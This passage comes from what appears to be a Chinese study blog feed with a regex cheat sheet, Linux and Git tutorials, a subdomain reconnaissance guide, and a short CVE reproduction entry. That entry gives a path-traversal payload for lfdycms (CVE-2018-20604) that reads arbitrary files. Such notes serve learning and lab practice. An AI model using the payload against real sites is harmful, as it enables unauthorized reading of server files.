align="center">指令</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">[abc]</td><td align="center">匹配方括号内的任意字符</td></tr><tr><td align="center">[a-c]</td><td align="center">匹配小写字母</td></tr><tr><td align="center">[a-fA-F0-9]</td><td align="center">匹配小写+大写英文字符以及数字</td></tr><tr><td align="center">[^0-9]</td><td align="center">匹配非数字字符</td></tr></tbody></table><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><table><thead><tr><th align="center">指令</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">\d</td><td align="center">匹配数字字符</td></tr><tr><td align="center">\D</td><td align="center">匹配非数字字符</td></tr><tr><td align="center">\w</td><td align="center">匹配单词字符(英文、数字、下划线)</td></tr><tr><td align="center">\W</td><td align="center">匹配非单词字符</td></tr><tr><td align="center">\s</td><td align="center">匹配空白符(包含换行符、Tab)</td></tr><tr><td align="center">\S</td><td align="center">匹配非空白字符</td></tr><tr><td align="center">.</td><td align="center">匹配任意单个字符(换行符除外)</td></tr><tr><td align="center">\bword\b</td><td align="center">匹配单词边界</td></tr><tr><td align="center">^</td><td align="center">匹配行首</td></tr><tr><td align="center">＄</td><td align="center">匹配行尾</td></tr></tbody></table><h2 id="贪婪-懒惰匹配"><a href="#贪婪-懒惰匹配" class="headerlink" title="贪婪/懒惰匹配"></a>贪婪/懒惰匹配</h2><table><thead><tr><th align="center">指令</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">&lt;.+&gt;</td><td align="center">默认贪婪匹配“任意字符”</td></tr><tr><td align="center">く.+?&gt;</td><td align="center">懒惰匹配“任意字符”</td></tr></tbody></table><h2 id="常见匹配"><a href="#常见匹配" class="headerlink" title="常见匹配"></a>常见匹配</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//邮箱</span><br><span class="line">^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$</span><br><span class="line"></span><br><span class="line">//手机号</span><br><span class="line">^1[3-9]\d{9}$</span><br><span class="line"></span><br><span class="line">//URL网址</span><br><span class="line">^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&amp;//=]*)$</span><br><span class="line"></span><br><span class="line">//IP地址</span><br><span class="line">^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$</span><br><span class="line"></span><br><span class="line">//日期格式</span><br><span class="line">^\d{4}-\d{2}-\d{2}$</span><br><span class="line"></span><br><span class="line">//密码强度</span><br><span class="line">^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[a-zA-Z\d@$!%*?&amp;]{8,}$</span><br><span class="line"></span><br><span class="line">//身份证</span><br><span class="line">^[1-9]\d{5}(18|19|20)\d{2}(0[1-9]|1[0-2])(0[1-9]|[12]\d|3[01])\d{3}[\dX]$</span><br><span class="line"></span><br><span class="line">//中文姓名</span><br><span class="line">^[\u4e00-\u9fa5]{2,4}$</span><br><span class="line"></span><br><span class="line">//车牌号</span><br><span class="line">^[京津沪渝冀豫云辽黑湘皖鲁新苏浙赣鄂桂甘晋蒙陕吉闽贵粤青藏川宁琼使领][A-HJ-NP-Z][A-HJ-NP-Z0-9]{4}[A-HJ-NP-Z0-9挂学警港澳]$</span><br><span class="line"></span><br><span class="line">//QQ号</span><br><span class="line">^[1-9][0-9]{4,10}$</span><br><span class="line"></span><br><span class="line">//微信号</span><br><span class="line">^[a-zA-Z][-_a-zA-Z0-9]{5,19}$</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-任意文件读取靶标复现</title>
      <link href="/2025/07/12/cve-ren-yi-wen-jian-du-qu-ba-biao-fu-xian/"/>
      <url>/2025/07/12/cve-ren-yi-wen-jian-du-qu-ba-biao-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-任意文件读取靶标复现"><a href="#CVE-任意文件读取靶标复现" class="headerlink" title="CVE-任意文件读取靶标复现"></a>CVE-任意文件读取靶标复现</h1><h2 id="CVE-2014-4577（WordPress）"><a href="#CVE-2014-4577（WordPress）" class="headerlink" title="CVE-2014-4577（WordPress）"></a>CVE-2014-4577（WordPress）</h2><h2 id="CVE-2018-16283（WordPress）"><a href="#CVE-2018-16283（WordPress）" class="headerlink" title="CVE-2018-16283（WordPress）"></a>CVE-2018-16283（WordPress）</h2><h2 id="CVE-2018-20604（lfdycms）"><a href="#CVE-2018-20604（lfdycms）" class="headerlink" title="CVE-2018-20604（lfdycms）"></a>CVE-2018-20604（lfdycms）</h2><blockquote><p>雷风影视CMS是一款采用PHP基于THINKPHP3.2.3框架开发，适合各类视频、影视网站的影视内容管理程序，该CMS存在缺陷，可以通过  <code>admin.php?s=/Template/edit/path/*web*..*..*..*..*1.txt </code>的方式读取任意文件。</p></blockquote><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux命令</title>
      <link href="/2025/07/05/linux-ming-ling/"/>
      <url>/2025/07/05/linux-ming-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h1><h2 id="目录结构介绍"><a href="#目录结构介绍" class="headerlink" title="目录结构介绍"></a>目录结构介绍</h2><table><thead><tr><th align="center">目录名称</th><th align="center">功能说明</th></tr></thead><tbody><tr><td align="center"><strong>bin</strong></td><td align="center">binary 的缩写，存放常用命令（如 <code>ls</code>, <code>cp</code>, <code>mv</code>）。</td></tr><tr><td align="center"><strong>boot</strong></td><td align="center">存放 Linux <strong>启动时</strong>所需的核心文件。</td></tr><tr><td align="center"><strong>dev</strong></td><td align="center">device 的缩写，存放设备文件（如硬件接口）。</td></tr><tr><td align="center"><strong>etc</strong></td><td align="center">存放系统配置文件及子目录（如网络配置、用户配置）。</td></tr><tr><td align="center"><strong>home</strong></td><td align="center">存放普通用户的主目录（如 <code>/home/username</code>）。</td></tr><tr><td align="center"><strong>lib</strong></td><td align="center">library 的缩写，存放动态库文件供应用程序调用。</td></tr><tr><td align="center"><strong>lost+found</strong></td><td align="center">系统非法关闭后，恢复的文件存放于此（通常为空）。</td></tr><tr><td align="center"><strong>media</strong></td><td align="center">自动挂载可移动设备（如 U 盘、光驱）。</td></tr><tr><td align="center"><strong>mnt</strong></td><td align="center">用户手动挂载临时文件系统（如额外硬盘）。</td></tr><tr><td align="center"><strong>opt</strong></td><td align="center">存放额外安装的第三方软件。</td></tr><tr><td align="center"><strong>proc</strong></td><td align="center">虚拟目录，映射系统内存信息（如进程、硬件状态）。</td></tr><tr><td align="center"><strong>root</strong></td><td align="center">超级用户（root）的主目录。</td></tr><tr><td align="center"><strong>sbin</strong></td><td align="center">super user 的简称，存放系统管理程序（如 <code>fdisk</code>, <code>ifconfig</code>）。</td></tr><tr><td align="center"><strong>srv</strong></td><td align="center">存放系统服务启动后的数据（如 Web 服务的网站文件）。</td></tr><tr><td align="center"><strong>run</strong></td><td align="center">存放系统运行时需要的临时文件（如进程 ID 文件）。</td></tr><tr><td align="center"><strong>usr</strong></td><td align="center">存放用户的应用程序及文件（类似 Windows 的 <code>Program Files</code>）。</td></tr><tr><td align="center"><strong>usr/bin</strong></td><td align="center">存放系统用户使用的应用程序。</td></tr><tr><td align="center"><strong>usr/sbin</strong></td><td align="center">存放超级用户使用的高级程序及系统守护程序。</td></tr><tr><td align="center"><strong>usr/src</strong></td><td align="center">存放内核源代码（默认目录）。</td></tr><tr><td align="center"><strong>tmp</strong></td><td align="center">存放临时文件（重启后可能清空）。</td></tr><tr><td align="center"><strong>var</strong></td><td align="center">存放频繁修改的文件（如日志、电子邮件）。</td></tr></tbody></table><h2 id="系统文件或目录颜色的含义"><a href="#系统文件或目录颜色的含义" class="headerlink" title="系统文件或目录颜色的含义"></a>系统文件或目录颜色的含义</h2><img src="https://pic1.imgdb.cn/item/686a89cc58cb8da5c892a707.png" style="zoom:50%;"><h2 id="终端快捷键"><a href="#终端快捷键" class="headerlink" title="终端快捷键"></a>终端快捷键</h2><table><thead><tr><th align="center">快捷键</th><th align="center">功能描述</th></tr></thead><tbody><tr><td align="center"><code>Ctrl + F</code></td><td align="center">向前移动光标</td></tr><tr><td align="center"><code>Ctrl + B</code></td><td align="center">向后移动光标</td></tr><tr><td align="center"><code>Ctrl + A</code></td><td align="center">光标移动到行首</td></tr><tr><td align="center"><code>Ctrl + E</code></td><td align="center">光标移动到行尾</td></tr><tr><td align="center"><code>Ctrl + P</code></td><td align="center">向上翻页（相当于 PageUp）</td></tr><tr><td align="center"><code>Ctrl + N</code></td><td align="center">向下翻页（相当于 PageDown）</td></tr><tr><td align="center"><code>Ctrl + H</code></td><td align="center">删除光标前一个字符</td></tr><tr><td align="center"><code>Ctrl + D</code></td><td align="center">删除光标所在字符</td></tr><tr><td align="center"><code>Ctrl + U</code></td><td align="center">删除光标至行首全部内容（不包括当前字符）</td></tr><tr><td align="center"><code>Ctrl + K</code></td><td align="center">删除光标至行尾全部内容（包括当前字符）</td></tr><tr><td align="center"><code>Ctrl + W</code></td><td align="center">删除光标前一个单词</td></tr><tr><td align="center"><code>Ctrl + Y</code></td><td align="center">粘贴最近被 <code>Ctrl+W/U/K</code> 删除的文本</td></tr></tbody></table><h2 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h2><p>作用：</p><ol><li>改变已有文件的时间戳属性</li><li>创建新的空文件</li></ol><p>使用：</p><table><thead><tr><th align="center">命令</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">touch file.txt</td><td align="center">创建一个空文件</td></tr><tr><td align="center">touch file1.txt file2.txt file3.txt</td><td align="center">创建多个空文件</td></tr><tr><td align="center">touch file.txt</td><td align="center">修改已有文件的时间戳为当前系统时间（包括修改时间和访问时间）</td></tr><tr><td align="center">touch -a file.txt</td><td align="center">修改文件的 access时间</td></tr><tr><td align="center">touch -m file.txt</td><td align="center">修改文件的modify时间</td></tr><tr><td align="center">touch -c nofile.txt<br>touch –no-create nofile.txt</td><td align="center">强制避免创建新文件</td></tr><tr><td align="center">touch file.txt（更改文件） -r ref_file.txt（参照文件）</td><td align="center">将访问和修改时间从一个文件复制到另一个文件</td></tr><tr><td align="center">touch -d “tomorrow” file.txt</td><td align="center">修改文件时间为明天</td></tr><tr><td align="center">touch -t 2201011030.55 file.txt</td><td align="center">修改文件时间为任意时间（22年1月1日10点30分55秒）</td></tr><tr><td align="center">stat file.txt</td><td align="center">查看文件状态</td></tr></tbody></table><h2 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h2><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><p>（一）谷歌语法</p><p>site:baidu.com</p><p>intitle:xxxx</p><p>（二）Github查询</p><p>直接搜索对应域名，查看是否存在子域名信息</p><p>（三）SSL/TLS 证书透明度日志查询</p><p><a href="https://crt.sh/">crt.sh | Certificate Search</a></p><p>（四）DNS解析记录</p><p>在配置DNS服务时会产生记录，这些记录中可能包含子域名相关信息</p><p>DNS记录在线查询平台：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p><p>（五）字典暴力枚举</p><p>原理：用字典前缀与主域名组合查询子域名是否存在。</p><p>字典选择制作</p><ul><li><p>公开字典：github搜索。<a href="https://github.com/search">https://github.com/search</a></p></li><li><p>自定义：分析目标特点推测前缀，整理成字典，结合历史信息丰富内容。</p></li></ul><p>（六）企业信息查询平台</p><p>企业信息查询平台：会提供企业工商信息、知识产权信息、网站备案信息、其他企业相关信息等信息。</p><p>例如：企查查、天眼查、启信宝等。</p><p>（七）在线子域名查询网站</p><p>站长工具:<a href="https://tool.chinaz.com/subdomain/">https://tool.chinaz.com/subdomain/</a></p><p>查子域：<a href="https://chaziyu.com/">https://chaziyu.com/</a></p><p>（八）在线工具</p><ol><li><p>OneForAll</p><ul><li>特点：功能强，自动化、扩展性高，集成多种技术，支持多线程和分布式有插件机制。</li><li>链接:<a href="https://github.com/shmilyIty/OneForAll">https://github.com/shmilyIty/OneForAll</a></li><li>基础使用：</li><li>python3 oneforall.py –target example.com run       单个域名</li><li>python3 oneforall.py –targets ./example.txt run      批量域名</li></ul></li><li><p>Layer子域名挖掘机</p><ul><li>特点：功能强，自动化、扩展性高，集成多种技术，支持多线程和分布式扫描，有插件机制。</li><li>链接:<a href="https://github.com/euphrat1ca/LayerDomainFinder">https://github.com/euphrat1ca/LayerDomainFinder</a></li></ul></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Git</title>
      <link href="/2025/07/03/git/"/>
      <url>/2025/07/03/git/</url>
      
        <content type="html"><![CDATA[<p>git安装可以参考其他安装教程</p><blockquote><p>在git bash中时可以使用linux命令的，因为linux和git都是同一个人开发的</p></blockquote><h1 id="Git-常用命令"><a href="#Git-常用命令" class="headerlink" title="Git 常用命令"></a>Git 常用命令</h1><table><thead><tr><th align="center">命令名称</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">git config –global user.name xxx</td><td align="center">设置用户签名</td></tr><tr><td align="center">git config –global user.email <a href="mailto:xxx@xx.com">xxx@xx.com</a></td><td align="center">设置用户邮箱，虚拟邮箱，可任意设置，无验证</td></tr><tr><td align="center">git init</td><td align="center">初始化本地库</td></tr><tr><td align="center">git status</td><td align="center">查看本地库状态</td></tr><tr><td align="center">git add xxx</td><td align="center">添加暂存区</td></tr><tr><td align="center">git rm –cached xxx</td><td align="center">从暂存区中删除</td></tr><tr><td align="center">git commit -m “日志信息” xxx</td><td align="center">提交本地库</td></tr><tr><td align="center">git reflog</td><td align="center">查看简洁日志</td></tr><tr><td align="center">git log</td><td align="center">查看详细日志</td></tr><tr><td align="center">git reset –hard 版本号</td><td align="center">版本穿梭</td></tr></tbody></table><h2 id="1-设置用户签名"><a href="#1-设置用户签名" class="headerlink" title="1 设置用户签名"></a>1 设置用户签名</h2><ol><li>在git bash中使用以下命令</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name xxx//设置用户签名</span><br><span class="line">git config --global user.email xxx@xx.com   //设置用户邮箱，虚拟邮箱，可任意设置，无验证</span><br></pre></td></tr></tbody></table></figure><p>打开C盘-用户-（对应用户目录下）-.gitconfig中可以查看和更改以上信息</p><h2 id="2-初始化本地库"><a href="#2-初始化本地库" class="headerlink" title="2 初始化本地库"></a>2 初始化本地库</h2><ol><li>创建一个文件夹，进入该文件夹，打开git bash，输入以下命令</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></tbody></table></figure><p>命令执行后，会生成一个<strong>隐藏文件夹.git</strong>，这个<strong>文件夹不要更改</strong></p><h2 id="3-查看本地库状态"><a href="#3-查看本地库状态" class="headerlink" title="3 查看本地库状态"></a>3 查看本地库状态</h2><ol><li>同样在git bash中输入以下命令</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></tbody></table></figure><p>第一次查看本地库状态时，会显示</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">On branch master//在master分支中</span><br><span class="line">No commits yet//没有提交过内容到本地库中</span><br><span class="line">nothing to commit, working tree clean//没有内容需要提交</span><br></pre></td></tr></tbody></table></figure><p>在当前目录下，新增一个文件之后，再次查看本地库状态</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use "git add &lt;file&gt;..." to update what will be committed)</span><br><span class="line">  (use "git restore &lt;file&gt;..." to discard changes in working directory)</span><br><span class="line">        modified:   hello.txt//红色字体</span><br></pre></td></tr></tbody></table></figure><p>最后一行，红色字体表示该文件目前只存在与<strong>工作区</strong>，git还没有追踪过这个文件，需要使用git add将此文件存到暂存区中。添加之后就会变成绿色字体</p><h2 id="4-添加暂存区"><a href="#4-添加暂存区" class="headerlink" title="4 添加暂存区"></a>4 添加暂存区</h2><p>将工作区的文件提交到暂存区命令：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add xxx</span><br></pre></td></tr></tbody></table></figure><ol><li><p>添加时如果提示warning：LF will be replaced by CRLF ，因为LF时Linux中的换行符，CRLF时Windows的换行符，如果你是使用vim创建的文件，那就是以LF作为换行符。在当初安装git时，就选择了换行符自动转换的配置，所以此处的warning不用管</p></li><li><p>一旦文件进行修改，在查看本地库状态商家，modified:   hello.txt（文件）就会是红色字体，就需要重新将其添加到暂存区，才会变成绿色字体</p></li><li><p>如果不想要文件了，可以将其从暂存区中删除</p></li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rm --cached xxx</span><br></pre></td></tr></tbody></table></figure><h2 id="5-提交本地库"><a href="#5-提交本地库" class="headerlink" title="5 提交本地库"></a>5 提交本地库</h2><p>将暂存区的文件提交到本地库</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m "日志信息" xxx</span><br></pre></td></tr></tbody></table></figure><ul><li>查看日志信息</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git reflog//查看简洁日志</span><br><span class="line">git log//查看详细日志</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ git reflog</span><br><span class="line">0078f5e (HEAD -&gt; master) HEAD@{0}: reset: moving to 0078f5e</span><br><span class="line">6a535c2 HEAD@{1}: commit: third commit</span><br><span class="line">0078f5e (HEAD -&gt; master) HEAD@{2}: commit: second commit</span><br><span class="line">a94b398 HEAD@{3}: commit (initial): first commit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ git log</span><br><span class="line">commit 0078f5ee515a48ed4300860520556e1709f437ac (HEAD -&gt; master)</span><br><span class="line">Author: mX1@0 &lt;mX1@0@qq.com&gt;</span><br><span class="line">Date:   Thu Jul 3 15:28:36 2025 +0800</span><br><span class="line"></span><br><span class="line">    second commit</span><br><span class="line"></span><br><span class="line">commit a94b398c1ee7c3faa1560ec43ba1b9b757f78540</span><br><span class="line">Author: mX1@0 &lt;mX1@0@qq.com&gt;</span><br><span class="line">Date:   Thu Jul 3 15:25:33 2025 +0800</span><br><span class="line"></span><br><span class="line">    first commit</span><br></pre></td></tr></tbody></table></figure><p>其中0078f5e为版本号</p><h2 id="6-版本穿梭"><a href="#6-版本穿梭" class="headerlink" title="6 版本穿梭"></a>6 版本穿梭</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 版本号</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//当前的HEAD指向第三个版本</span><br><span class="line">$ git reflog</span><br><span class="line">6a535c2 (HEAD -&gt; master) HEAD@{0}: commit: third commit</span><br><span class="line">0078f5e HEAD@{1}: commit: second commit</span><br><span class="line">a94b398 HEAD@{2}: commit (initial): first commit</span><br><span class="line"></span><br><span class="line">//将当前HEAD指向第二个版本，那么开发区的hello.txt文件将会变回第二个版本的内容</span><br><span class="line">$ git reset --hard 0078f5e</span><br><span class="line">HEAD is now at 0078f5e third commit</span><br><span class="line"></span><br><span class="line">//HEAD指向第二个版本后，查看日志，HEAD就指向了第二个版本</span><br><span class="line">$ git reflog</span><br><span class="line">0078f5e (HEAD -&gt; master) HEAD@{0}: reset: moving to 0078f5e</span><br><span class="line">6a535c2 HEAD@{1}: commit: third commit</span><br><span class="line">0078f5e (HEAD -&gt; master) HEAD@{2}: commit: second commit</span><br><span class="line">a94b398 HEAD@{3}: commit (initial): first commit</span><br></pre></td></tr></tbody></table></figure><p>在.git-refs-heads-master中可以看到当前所属的版本号</p><p>git切换版本，底层其实是移动的HEAD指针，而不是使用副本</p><h1 id="Git分支操作"><a href="#Git分支操作" class="headerlink" title="Git分支操作"></a>Git分支操作</h1><blockquote><p>分支：在版本控制过程中，同时推进多个任务，为每个任务，我们就可以创建每个任务的单独分支。使用分支意味着程序员可以把自己的工作从开发主线上分离开来，开发自己分支的时候，不会影响主线分支的运行。对于初学者而言，分支可以简单理解为副本，一个分支就是一个单独的副本。（分支底层其实也是指针的引用）</p></blockquote><p>分支的好处：可以同时并行推进多个功能开发，提高开发效率</p><table><thead><tr><th align="center">命令名称</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">git branch 分支名</td><td align="center">创建分支</td></tr><tr><td align="center">git branch -v</td><td align="center">查看分支</td></tr><tr><td align="center">git checkout 分支名</td><td align="center">切换分支</td></tr><tr><td align="center">git merge 分支名</td><td align="center">把指定的分支合并到当前分支上</td></tr></tbody></table><h2 id="1-查看分支"><a href="#1-查看分支" class="headerlink" title="1 查看分支"></a>1 查看分支</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git branch -v</span><br><span class="line">* master 6a535c2 third commit//*代表当前所在的分区</span><br></pre></td></tr></tbody></table></figure><h2 id="2-创建分支"><a href="#2-创建分支" class="headerlink" title="2 创建分支"></a>2 创建分支</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git branch 分支名</span><br><span class="line">eg：</span><br><span class="line">$ git branch hot-fix</span><br><span class="line"></span><br><span class="line">$ git branch -v</span><br><span class="line">  hot-fix 6a535c2 third commit</span><br><span class="line">* master  6a535c2 third commit</span><br></pre></td></tr></tbody></table></figure><h2 id="3-修改分支"><a href="#3-修改分支" class="headerlink" title="3 修改分支"></a>3 修改分支</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">git checkout 分支名</span><br><span class="line">eg:</span><br><span class="line">XXX@XXX MINGW64 /d/git-space (master)</span><br><span class="line">$ git checkout hot-fix</span><br><span class="line">Switched to branch 'hot-fix'</span><br><span class="line"></span><br><span class="line">XXX@XXX MINGW64 /d/git-space (hot-fix)//此处变成hot-fix</span><br><span class="line"></span><br><span class="line">$ git branch -v//再次查看分支</span><br><span class="line">* hot-fix 6a535c2 third commit//此时*指向hot-fix</span><br><span class="line">  master  6a535c2 third commit</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="4-合并分支"><a href="#4-合并分支" class="headerlink" title="4 合并分支"></a>4 合并分支</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git merge 分支名</span><br><span class="line">eg:</span><br><span class="line">XXX@XXX MINGW64 /d/git-space (master)//需要在master下继续合并</span><br><span class="line">$ git merge hot-fix</span><br><span class="line">Updating 6a535c2..33a165d</span><br><span class="line">Fast-forward</span><br><span class="line"> hello.txt | 4 ++--</span><br><span class="line"> 1 file changed, 2 insertions(+), 2 deletions(-)</span><br><span class="line"> </span><br><span class="line">//hot-fix会被合并到matser上，hello.txt内容会变成hot-fix分支下hello.txt的内容</span><br></pre></td></tr></tbody></table></figure><h2 id="5-冲突合并"><a href="#5-冲突合并" class="headerlink" title="5 冲突合并"></a>5 冲突合并</h2><p>冲突产生的原因：</p><p>​合并分支时，两个分支在<strong>同一个文件的同一个位置</strong>有两套完全不同的修改。Git无法替我们决定使用哪一个。必须<strong>人为决定</strong>新代码内容。</p><p>​当进行强制合并时，git不知道如何合并，所以会显示合并不成功，查看状态可以看到未合并成功的文件，打开会看到如下显示</p><p><img src="https://pic1.imgdb.cn/item/6867c6b558cb8da5c8907ccf.png"></p><p>​HEAD和=====之间的是当前的，=====和&gt;&gt;&gt;&gt;&gt;&gt;之间的是被合并的分支中文件的内容</p><p>​那么就采取人为的将所有提示词以及其余部分删除，只留下含有master test和hot-fix test所在行，然后保存并退出文件。然后需要将文件重新上传到暂存区，并提交本地库，此时命令不能带文件名，否则会报错</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m "merge test" //不能有文件名</span><br></pre></td></tr></tbody></table></figure><p>​合并之后，只有master中的文件内容会改变，hot-fix分支的文件内容不变</p><h1 id="GitHub操作"><a href="#GitHub操作" class="headerlink" title="GitHub操作"></a>GitHub操作</h1><h2 id="1-创建远程仓库别名"><a href="#1-创建远程仓库别名" class="headerlink" title="1 创建远程仓库别名"></a>1 创建远程仓库别名</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git remote add 别名 https://github,com/xxxx/xxxx.git（远程仓库地址）</span><br><span class="line">eg；</span><br><span class="line">$ git remote add xxx https://github.com/xxx/git-space.git</span><br><span class="line"></span><br><span class="line">$ git remote -v//查看别名</span><br><span class="line">xxx     https://github.com/xxx/git-space.git (fetch)</span><br><span class="line">xxx     https://github.com/xxx/git-space.git (push)</span><br></pre></td></tr></tbody></table></figure><h2 id="2-推送本地分支到远程仓库"><a href="#2-推送本地分支到远程仓库" class="headerlink" title="2 推送本地分支到远程仓库"></a>2 推送本地分支到远程仓库</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git push 别名 分支</span><br><span class="line">eg；</span><br><span class="line">git push xxx master</span><br></pre></td></tr></tbody></table></figure><h2 id="3-拉取远程仓库代码"><a href="#3-拉取远程仓库代码" class="headerlink" title="3 拉取远程仓库代码"></a>3 拉取远程仓库代码</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git pull 别名 分支</span><br><span class="line">eg:</span><br><span class="line">git pull xxx master</span><br></pre></td></tr></tbody></table></figure><h2 id="4-克隆远程仓库到本地"><a href="#4-克隆远程仓库到本地" class="headerlink" title="4 克隆远程仓库到本地"></a>4 克隆远程仓库到本地</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone 远程地址</span><br></pre></td></tr></tbody></table></figure><p>克隆会做如下操作</p><ol><li>拉取代码</li><li>初始化本地仓库</li><li>创建别名</li></ol><h2 id="5-ssh免密登录"><a href="#5-ssh免密登录" class="headerlink" title="5 ssh免密登录"></a>5 